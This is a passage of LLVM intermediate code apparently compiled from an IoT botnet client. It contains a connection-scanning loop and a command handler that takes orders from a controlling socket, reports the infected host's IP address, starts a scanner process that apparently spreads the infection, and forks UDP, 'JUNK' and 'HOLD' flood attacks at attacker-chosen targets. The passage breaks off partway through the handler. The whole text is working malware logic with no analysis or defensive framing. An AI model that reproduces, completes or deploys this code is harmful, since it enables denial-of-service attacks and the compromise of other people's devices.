  %114 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %113) #2, !srcloc !7
  %115 = extractvalue { i64, i64* } %114, 0
  %116 = extractvalue { i64, i64* } %114, 1
  %117 = trunc i64 %115 to i32
  store i32 %117, i32* %18, align 4
  %118 = ptrtoint i64* %116 to i64
  %119 = trunc i64 %118 to i32
  store i32 %119, i32* %19, align 4
  br label %120

; <label>:120:                                    ; preds = %111
  br label %121

; <label>:121:                                    ; preds = %120
  %122 = load i32, i32* %8, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %123
  %125 = getelementptr inbounds %struct.state_t, %struct.state_t* %124, i32 0, i32 0
  %126 = load i32, i32* %125, align 8
  %127 = srem i32 %126, 64
  %128 = zext i32 %127 to i64
  %129 = shl i64 1, %128
  %130 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %131 = load i32, i32* %8, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %132
  %134 = getelementptr inbounds %struct.state_t, %struct.state_t* %133, i32 0, i32 0
  %135 = load i32, i32* %134, align 8
  %136 = sdiv i32 %135, 64
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds [16 x i64], [16 x i64]* %130, i64 0, i64 %137
  %139 = load i64, i64* %138, align 8
  %140 = or i64 %139, %129
  store i64 %140, i64* %138, align 8
  %141 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %141, align 8
  %142 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %142, align 8
  %143 = load i32, i32* %8, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %144
  %146 = getelementptr inbounds %struct.state_t, %struct.state_t* %145, i32 0, i32 0
  %147 = load i32, i32* %146, align 8
  %148 = add nsw i32 %147, 1
  %149 = call i32 @select(i32 %148, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %149, i32* %15, align 4
  %150 = load i32, i32* %15, align 4
  %151 = icmp eq i32 %150, 1
  br i1 %151, label %152, label %179

; <label>:152:                                    ; preds = %121
  store i32 4, i32* %13, align 4
  %153 = load i32, i32* %8, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %154
  %156 = getelementptr inbounds %struct.state_t, %struct.state_t* %155, i32 0, i32 0
  %157 = load i32, i32* %156, align 8
  %158 = bitcast i32* %14 to i8*
  %159 = call i32 @getsockopt(i32 %157, i32 1, i32 4, i8* %158, i32* %13) #2
  %160 = load i32, i32* %14, align 4
  %161 = icmp ne i32 %160, 0
  br i1 %161, label %162, label %173

; <label>:162:                                    ; preds = %152
  %163 = load i32, i32* %8, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %164
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %165, i32 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = call i32 @close(i32 %167)
  %169 = load i32, i32* %8, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %170
  %172 = getelementptr inbounds %struct.state_t, %struct.state_t* %171, i32 0, i32 1
  store i8 0, i8* %172, align 4
  br label %178

; <label>:173:                                    ; preds = %152
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 1
  store i8 2, i8* %177, align 4
  br label %178

; <label>:178:                                    ; preds = %173, %162
  br label %194

; <label>:179:                                    ; preds = %121
  %180 = load i32, i32* %15, align 4
  %181 = icmp eq i32 %180, -1
  br i1 %181, label %182, label %193

; <label>:182:                                    ; preds = %179
  %183 = load i32, i32* %8, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %184
  %186 = getelementptr inbounds %struct.state_t, %struct.state_t* %185, i32 0, i32 0
  %187 = load i32, i32* %186, align 8
  %188 = call i32 @close(i32 %187)
  %189 = load i32, i32* %8, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %190
  %192 = getelementptr inbounds %struct.state_t, %struct.state_t* %191, i32 0, i32 1
  store i8 0, i8* %192, align 4
  br label %193

; <label>:193:                                    ; preds = %182, %179
  br label %194

; <label>:194:                                    ; preds = %193, %178
  br label %249

; <label>:195:                                    ; preds = %59
  br label %196

; <label>:196:                                    ; preds = %195
  %197 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %198 = getelementptr inbounds [16 x i64], [16 x i64]* %197, i64 0, i64 0
  %199 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %198) #2, !srcloc !8
  %200 = extractvalue { i64, i64* } %199, 0
  %201 = extractvalue { i64, i64* } %199, 1
  %202 = trunc i64 %200 to i32
  store i32 %202, i32* %20, align 4
  %203 = ptrtoint i64* %201 to i64
  %204 = trunc i64 %203 to i32
  store i32 %204, i32* %21, align 4
  br label %205

; <label>:205:                                    ; preds = %196
  br label %206

; <label>:206:                                    ; preds = %205
  %207 = load i32, i32* %8, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = srem i32 %211, 64
  %213 = zext i32 %212 to i64
  %214 = shl i64 1, %213
  %215 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %216 = load i32, i32* %8, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %217
  %219 = getelementptr inbounds %struct.state_t, %struct.state_t* %218, i32 0, i32 0
  %220 = load i32, i32* %219, align 8
  %221 = sdiv i32 %220, 64
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds [16 x i64], [16 x i64]* %215, i64 0, i64 %222
  %224 = load i64, i64* %223, align 8
  %225 = or i64 %224, %214
  store i64 %225, i64* %223, align 8
  %226 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %226, align 8
  %227 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %227, align 8
  %228 = load i32, i32* %8, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %229
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 8
  %233 = add nsw i32 %232, 1
  %234 = call i32 @select(i32 %233, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %234, i32* %15, align 4
  %235 = load i32, i32* %15, align 4
  %236 = icmp ne i32 %235, 0
  br i1 %236, label %237, label %248

; <label>:237:                                    ; preds = %206
  %238 = load i32, i32* %8, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %239
  %241 = getelementptr inbounds %struct.state_t, %struct.state_t* %240, i32 0, i32 0
  %242 = load i32, i32* %241, align 8
  %243 = call i32 @close(i32 %242)
  %244 = load i32, i32* %8, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %245
  %247 = getelementptr inbounds %struct.state_t, %struct.state_t* %246, i32 0, i32 1
  store i8 0, i8* %247, align 4
  br label %248

; <label>:248:                                    ; preds = %237, %206
  br label %249

; <label>:249:                                    ; preds = %248, %194, %109, %59
  br label %250

; <label>:250:                                    ; preds = %249
  %251 = load i32, i32* %8, align 4
  %252 = add nsw i32 %251, 1
  store i32 %252, i32* %8, align 4
  br label %55

; <label>:253:                                    ; preds = %55
  br label %50

; <label>:254:                                    ; preds = %50
  %255 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %255)
  br label %256

; <label>:256:                                    ; preds = %254, %33
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i8*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i8*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %32 = load i8**, i8*** %4, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @strcmp(i8* %34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i32 0, i32 0)) #10
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %40, label %37

; <label>:37:                                     ; preds = %2
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = call i32 (i32, i8*, ...) @sockprintf(i32 %38, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.45, i32 0, i32 0))
  br label %526

; <label>:40:                                     ; preds = %2
  %41 = load i8**, i8*** %4, align 8
  %42 = getelementptr inbounds i8*, i8** %41, i64 0
  %43 = load i8*, i8** %42, align 8
  %44 = call i32 @strcmp(i8* %43, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.46, i32 0, i32 0)) #10
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %51, label %46

; <label>:46:                                     ; preds = %40
  %47 = load i32, i32* @mainCommSock, align 4
  %48 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %49 = call i8* @inet_ntoa(i32 %48) #2
  %50 = call i32 (i32, i8*, ...) @sockprintf(i32 %47, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.47, i32 0, i32 0), i8* %49)
  br label %526

; <label>:51:                                     ; preds = %40
  %52 = load i8**, i8*** %4, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 0
  %54 = load i8*, i8** %53, align 8
  %55 = call i32 @strcmp(i8* %54, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.48, i32 0, i32 0)) #10
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %100, label %57

; <label>:57:                                     ; preds = %51
  %58 = load i32, i32* %3, align 4
  %59 = icmp ne i32 %58, 2
  br i1 %59, label %60, label %63

; <label>:60:                                     ; preds = %57
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.49, i32 0, i32 0))
  br label %526

; <label>:63:                                     ; preds = %57
  %64 = load i8**, i8*** %4, align 8
  %65 = getelementptr inbounds i8*, i8** %64, i64 1
  %66 = load i8*, i8** %65, align 8
  %67 = call i32 @strcmp(i8* %66, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.50, i32 0, i32 0)) #10
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %76, label %69

; <label>:69:                                     ; preds = %63
  %70 = load i32, i32* @scanPid, align 4
  %71 = icmp eq i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %69
  br label %526

; <label>:73:                                     ; preds = %69
  %74 = load i32, i32* @scanPid, align 4
  %75 = call i32 @kill(i32 %74, i32 9) #2
  store i32 0, i32* @scanPid, align 4
  br label %76

; <label>:76:                                     ; preds = %73, %63
  %77 = load i8**, i8*** %4, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 1
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @strcmp(i8* %79, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.51, i32 0, i32 0)) #10
  %81 = icmp ne i32 %80, 0
  br i1 %81, label %99, label %82

; <label>:82:                                     ; preds = %76
  %83 = load i32, i32* @scanPid, align 4
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %86

; <label>:85:                                     ; preds = %82
  br label %526

; <label>:86:                                     ; preds = %82
  %87 = call i32 @fork() #2
  store i32 %87, i32* %6, align 4
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0))
  %89 = load i32, i32* %6, align 4
  %90 = icmp ugt i32 %89, 0
  br i1 %90, label %91, label %93

; <label>:91:                                     ; preds = %86
  %92 = load i32, i32* %6, align 4
  store i32 %92, i32* @scanPid, align 4
  br label %526

; <label>:93:                                     ; preds = %86
  %94 = load i32, i32* %6, align 4
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %96, label %97

; <label>:96:                                     ; preds = %93
  br label %526

; <label>:97:                                     ; preds = %93
  br label %98

; <label>:98:                                     ; preds = %97
  call void @StartTheLelz(i32 1)
  call void @_exit(i32 0) #12
  unreachable

; <label>:99:                                     ; preds = %76
  br label %100

; <label>:100:                                    ; preds = %99, %51
  %101 = load i8**, i8*** %4, align 8
  %102 = getelementptr inbounds i8*, i8** %101, i64 0
  %103 = load i8*, i8** %102, align 8
  %104 = call i32 @strcmp(i8* %103, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0)) #10
  %105 = icmp ne i32 %104, 0
  br i1 %105, label %162, label %106

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* %3, align 4
  %108 = icmp slt i32 %107, 4
  br i1 %108, label %121, label %109

; <label>:109:                                    ; preds = %106
  %110 = load i8**, i8*** %4, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 2
  %112 = load i8*, i8** %111, align 8
  %113 = call i32 @atoi(i8* %112) #10
  %114 = icmp slt i32 %113, 1
  br i1 %114, label %121, label %115

; <label>:115:                                    ; preds = %109
  %116 = load i8**, i8*** %4, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 3
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 @atoi(i8* %118) #10
  %120 = icmp slt i32 %119, 1
  br i1 %120, label %121, label %122

; <label>:121:                                    ; preds = %115, %109, %106
  br label %526

; <label>:122:                                    ; preds = %115
  %123 = load i8**, i8*** %4, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 1
  %125 = load i8*, i8** %124, align 8
  store i8* %125, i8** %7, align 8
  %126 = load i8**, i8*** %4, align 8
  %127 = getelementptr inbounds i8*, i8** %126, i64 2
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 @atoi(i8* %128) #10
  store i32 %129, i32* %8, align 4
  %130 = load i8**, i8*** %4, align 8
  %131 = getelementptr inbounds i8*, i8** %130, i64 3
  %132 = load i8*, i8** %131, align 8
  %133 = call i32 @atoi(i8* %132) #10
  store i32 %133, i32* %9, align 4
  %134 = load i8*, i8** %7, align 8
  %135 = call i8* @strstr(i8* %134, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #10
  %136 = icmp ne i8* %135, null
  br i1 %136, label %137, label %153

; <label>:137:                                    ; preds = %122
  %138 = load i8*, i8** %7, align 8
  %139 = call i8* @strtok(i8* %138, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %139, i8** %10, align 8
  br label %140

; <label>:140:                                    ; preds = %150, %137
  %141 = load i8*, i8** %10, align 8
  %142 = icmp ne i8* %141, null
  br i1 %142, label %143, label %152

; <label>:143:                                    ; preds = %140
  %144 = call i32 @listFork()
  %145 = icmp ne i32 %144, 0
  br i1 %145, label %150, label %146

; <label>:146:                                    ; preds = %143
  %147 = load i8*, i8** %10, align 8
  %148 = load i32, i32* %8, align 4
  %149 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %147, i32 %148, i32 %149)
  call void @_exit(i32 0) #12
  unreachable

; <label>:150:                                    ; preds = %143
  %151 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %151, i8** %10, align 8
  br label %140

; <label>:152:                                    ; preds = %140
  br label %161

; <label>:153:                                    ; preds = %122
  %154 = call i32 @listFork()
  %155 = icmp ne i32 %154, 0
  br i1 %155, label %156, label %157

; <label>:156:                                    ; preds = %153
  br label %526

; <label>:157:                                    ; preds = %153
  %158 = load i8*, i8** %7, align 8
  %159 = load i32, i32* %8, align 4
  %160 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %158, i32 %159, i32 %160)
  call void @_exit(i32 0) #12
  unreachable

; <label>:161:                                    ; preds = %152
  br label %162

; <label>:162:                                    ; preds = %161, %100
  %163 = load i8**, i8*** %4, align 8
  %164 = getelementptr inbounds i8*, i8** %163, i64 0
  %165 = load i8*, i8** %164, align 8
  %166 = call i32 @strcmp(i8* %165, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.54, i32 0, i32 0)) #10
  %167 = icmp ne i32 %166, 0
  br i1 %167, label %226, label %168

; <label>:168:                                    ; preds = %162
  %169 = load i32, i32* %3, align 4
  %170 = icmp slt i32 %169, 4
  br i1 %170, label %183, label %171

; <label>:171:                                    ; preds = %168
  %172 = load i8**, i8*** %4, align 8
  %173 = getelementptr inbounds i8*, i8** %172, i64 2
  %174 = load i8*, i8** %173, align 8
  %175 = call i32 @atoi(i8* %174) #10
  %176 = icmp slt i32 %175, 1
  br i1 %176, label %183, label %177

; <label>:177:                                    ; preds = %171
  %178 = load i8**, i8*** %4, align 8
  %179 = getelementptr inbounds i8*, i8** %178, i64 3
  %180 = load i8*, i8** %179, align 8
  %181 = call i32 @atoi(i8* %180) #10
  %182 = icmp slt i32 %181, 1
  br i1 %182, label %183, label %184

; <label>:183:                                    ; preds = %177, %171, %168
  br label %526

; <label>:184:                                    ; preds = %177
  %185 = load i8**, i8*** %4, align 8
  %186 = getelementptr inbounds i8*, i8** %185, i64 1
  %187 = load i8*, i8** %186, align 8
  store i8* %187, i8** %11, align 8
  %188 = load i8**, i8*** %4, align 8
  %189 = getelementptr inbounds i8*, i8** %188, i64 2
  %190 = load i8*, i8** %189, align 8
  %191 = call i32 @atoi(i8* %190) #10
  store i32 %191, i32* %12, align 4
  %192 = load i8**, i8*** %4, align 8
  %193 = getelementptr inbounds i8*, i8** %192, i64 3
  %194 = load i8*, i8** %193, align 8
  %195 = call i32 @atoi(i8* %194) #10
  store i32 %195, i32* %13, align 4
  %196 = load i8*, i8** %11, align 8
  %197 = call i8* @strstr(i8* %196, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #10
  %198 = icmp ne i8* %197, null
  br i1 %198, label %199, label %217

; <label>:199:                                    ; preds = %184
  %200 = load i8*, i8** %11, align 8
  %201 = call i8* @strtok(i8* %200, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %201, i8** %14, align 8
  br label %202

; <label>:202:                                    ; preds = %214, %199
  %203 = load i8*, i8** %14, align 8
  %204 = icmp ne i8* %203, null
  br i1 %204, label %205, label %216

; <label>:205:                                    ; preds = %202
  %206 = call i32 @listFork()
  %207 = icmp ne i32 %206, 0
  br i1 %207, label %214, label %208

; <label>:208:                                    ; preds = %205
  %209 = load i8*, i8** %14, align 8
  %210 = load i32, i32* %12, align 4
  %211 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %209, i32 %210, i32 %211)
  %212 = load i32, i32* @mainCommSock, align 4
  %213 = call i32 @close(i32 %212)
  call void @_exit(i32 0) #12
  unreachable

; <label>:214:                                    ; preds = %205
  %215 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %215, i8** %14, align 8
  br label %202

; <label>:216:                                    ; preds = %202
  br label %225

; <label>:217:                                    ; preds = %184
  %218 = call i32 @listFork()
  %219 = icmp ne i32 %218, 0
  br i1 %219, label %220, label %221

; <label>:220:                                    ; preds = %217
  br label %526

; <label>:221:                                    ; preds = %217
  %222 = load i8*, i8** %11, align 8
  %223 = load i32, i32* %12, align 4
  %224 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %222, i32 %223, i32 %224)
  call void @_exit(i32 0) #12
  unreachable

; <label>:225:                                    ; preds = %216
  br label %226

; <label>:226:                                    ; preds = %225, %162
  %227 = load i8**, i8*** %4, align 8
  %228 = getelementptr inbounds i8*, i8** %227, i64 0
  %229 = load i8*, i8** %228, align 8
  %230 = call i32 @strcmp(i8* %229, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.55, i32 0, i32 0)) #10
  %231 = icmp ne i32 %230, 0
  br i1 %231, label %345, label %232

; <label>:232:                                    ; preds = %226
  %233 = load i32, i32* %3, align 4
  %234 = icmp slt i32 %233, 6
  br i1 %234, label %280, label %235

; <label>:235:                                    ; preds = %232
  %236 = load i8**, i8*** %4, align 8
  %237 = getelementptr inbounds i8*, i8** %236, i64 3
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 @atoi(i8* %238) #10
  %240 = icmp eq i32 %239, -1
  br i1 %240, label %280, label %241

; <label>:241:                                    ; preds = %235
  %242 = load i8**, i8*** %4, align 8
  %243 = getelementptr inbounds i8*, i8** %242, i64 2
  %244 = load i8*, i8** %243, align 8
  %245 = call i32 @atoi(i8* %244) #10
  %246 = icmp eq i32 %245, -1
  br i1 %246, label %280, label %247

; <label>:247:                                    ; preds = %241
  %248 = load i8**, i8*** %4, align 8
  %249 = getelementptr inbounds i8*, i8** %248, i64 4
  %250 = load i8*, i8** %249, align 8
  %251 = call i32 @atoi(i8* %250) #10
  %252 = icmp eq i32 %251, -1
  br i1 %252, label %280, label %253

; <label>:253:                                    ; preds = %247
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 5
  %256 = load i8*, i8** %255, align 8
  %257 = call i32 @atoi(i8* %256) #10
  %258 = icmp eq i32 %257, -1
  br i1 %258, label %280, label %259

; <label>:259:                                    ; preds = %253
  %260 = load i8**, i8*** %4, align 8
  %261 = getelementptr inbounds i8*, i8** %260, i64 5
  %262 = load i8*, i8** %261, align 8
  %263 = call i32 @atoi(i8* %262) #10
  %264 = icmp sgt i32 %263, 65500
  br i1 %264, label %280, label %265

; <label>:265:                                    ; preds = %259
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds i8*, i8** %266, i64 4
  %268 = load i8*, i8** %267, align 8
  %269 = call i32 @atoi(i8* %268) #10
  %270 = icmp sgt i32 %269, 32
  br i1 %270, label %280, label %271

; <label>:271:                                    ; preds = %265
  %272 = load i32, i32* %3, align 4
  %273 = icmp eq i32 %272, 7
  br i1 %273, label %274, label %281

; <label>:274:                                    ; preds = %271
  %275 = load i8**, i8*** %4, align 8
  %276 = getelementptr inbounds i8*, i8** %275, i64 6
  %277 = load i8*, i8** %276, align 8
  %278 = call i32 @atoi(i8* %277) #10
  %279 = icmp slt i32 %278, 1
  br i1 %279, label %280, label %281

; <label>:280:                                    ; preds = %274, %265, %259, %253, %247, %241, %235, %232
  br label %526

; <label>:281:                                    ; preds = %274, %271
  %282 = load i8**, i8*** %4, align 8
  %283 = getelementptr inbounds i8*, i8** %282, i64 1
  %284 = load i8*, i8** %283, align 8
  store i8* %284, i8** %15, align 8
  %285 = load i8**, i8*** %4, align 8
  %286 = getelementptr inbounds i8*, i8** %285, i64 2
  %287 = load i8*, i8** %286, align 8
  %288 = call i32 @atoi(i8* %287) #10
  store i32 %288, i32* %16, align 4
  %289 = load i8**, i8*** %4, align 8
  %290 = getelementptr inbounds i8*, i8** %289, i64 3
  %291 = load i8*, i8** %290, align 8
  %292 = call i32 @atoi(i8* %291) #10
  store i32 %292, i32* %17, align 4
  %293 = load i8**, i8*** %4, align 8
  %294 = getelementptr inbounds i8*, i8** %293, i64 4
  %295 = load i8*, i8** %294, align 8
  %296 = call i32 @atoi(i8* %295) #10
  store i32 %296, i32* %18, align 4
  %297 = load i8**, i8*** %4, align 8
  %298 = getelementptr inbounds i8*, i8** %297, i64 5
  %299 = load i8*, i8** %298, align 8
  %300 = call i32 @atoi(i8* %299) #10
  store i32 %300, i32* %19, align 4
  %301 = load i32, i32* %3, align 4
  %302 = icmp eq i32 %301, 7
  br i1 %302, label %303, label %308

; <label>:303:                                    ; preds = %281
  %304 = load i8**, i8*** %4, align 8
  %305 = getelementptr inbounds i8*, i8** %304, i64 6
  %306 = load i8*, i8** %305, align 8
  %307 = call i32 @atoi(i8* %306) #10
  br label %309

; <label>:308:                                    ; preds = %281
  br label %309

; <label>:309:                                    ; preds = %308, %303
  %310 = phi i32 [ %307, %303 ], [ 10, %308 ]
  store i32 %310, i32* %20, align 4
  %311 = load i8*, i8** %15, align 8
  %312 = call i8* @strstr(i8* %311, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #10
  %313 = icmp ne i8* %312, null
  br i1 %313, label %314, label %333

; <label>:314:                                    ; preds = %309
  %315 = load i8*, i8** %15, align 8
  %316 = call i8* @strtok(i8* %315, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %316, i8** %21, align 8
  br label %317

; <label>:317:                                    ; preds = %330, %314
  %318 = load i8*, i8** %21, align 8
  %319 = icmp ne i8* %318, null
  br i1 %319, label %320, label %332

; <label>:320:                                    ; preds = %317
  %321 = call i32 @listFork()
  %322 = icmp ne i32 %321, 0
  br i1 %322, label %330, label %323

; <label>:323:                                    ; preds = %320
  %324 = load i8*, i8** %21, align 8
  %325 = load i32, i32* %16, align 4
  %326 = load i32, i32* %17, align 4
  %327 = load i32, i32* %18, align 4
  %328 = load i32, i32* %19, align 4
  %329 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %324, i32 %325, i32 %326, i32 %327, i32 %328, i32 %329)
  call void @_exit(i32 0) #12
  unreachable

; <label>:330:                                    ; preds = %320
  %331 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.38, i32 0, i32 0)) #2
  store i8* %331, i8** %21, align 8
  br label %317

; <label>:332:                                    ; preds = %317
  br label %344

; <label>:333:                                    ; preds = %309
  %334 = call i32 @listFork()
  %335 = icmp ne i32 %334, 0
  br i1 %335, label %336, label %337

; <label>:336:                                    ; preds = %333
  br label %526

; <label>:337:                                    ; preds = %333
  %338 = load i8*, i8** %15, align 8
  %339 = load i32, i32* %16, align 4
  %340 = load i32, i32* %17, align 4
  %341 = load i32, i32* %18, align 4
  %342 = load i32, i32* %19, align 4
  %343 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %338, i32 %339, i32 %340, i32 %341, i32 %342, i32 %343)
  call void @_exit(i32 0) #12
  unreachable

; <label>:344:                                    ; preds = %332
  br label %345

; <label>:345:                                    ; preds = %344, %226
  %346 = load i8**, i8*** %4, align 8
  %347 = getelementptr inbounds i8*, i8** %346, i64 0
  %348 = load i8*, i8** %347, align 8
  %349 = call i32 @strcmp(i8* %348, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.56, i32 0, i32 0)) #10
  %350 = icmp ne i32 %349, 0
  br i1 %350, label %472, label %351

; <label>:351:                                    ; preds = %345
  %352 = load i32, i32* %3, align 4
  %353 = icmp slt i32 %352, 6
  br i1 %353, label %396, label %354

; <label>:354:                                    ; preds = %351
  %355 = load i8**, i8*** %4, align 8
  %356 = getelementptr inbounds i8*, i8** %355, i64 3
  %357 = load i8*, i8** %356, align 8
  %358 = call i32 @atoi(i8* %357) #10
  %359 = icmp eq i32 %358, -1
  br i1 %359, label %396, label %360

; <label>:360:                                    ; preds = %354
  %361 = load i8**, i8*** %4, align 8
  %362 = getelementptr inbounds i8*, i8** %361, i64 2
  %363 = load i8*, i8** %362, align 8
  %364 = call i32 @atoi(i8* %363) #10
  %365 = icmp eq i32 %364, -1
  br i1 %365, label %396, label %366

; <label>:366:                                    ; preds = %360
  %367 = load i8**, i8*** %4, align 8
  %368 = getelementptr inbounds i8*, i8** %367, i64 4
  %369 = load i8*, i8** %368, align 8
  %370 = call i32 @atoi(i8* %369) #10
  %371 = icmp eq i32 %370, -1
  br i1 %371, label %396, label %372

; <label>:372:                                    ; preds = %366
  %373 = load i8**, i8*** %4, align 8
  %374 = getelementptr inbounds i8*, i8** %373, i64 4
  %375 = load i8*, i8** %374, align 8
  %376 = call i32 @atoi(i8* %375) #10
  %377 = icmp sgt i32 %376, 32
  br i1 %377, label %396, label %378

; <label>:378:                                    ; preds = %372
  %379 = load i32, i32* %3, align 4
  %380 = icmp sgt i32 %379, 6
  br i1 %380, label %381, label %387

; <label>:381:                                    ; preds = %378
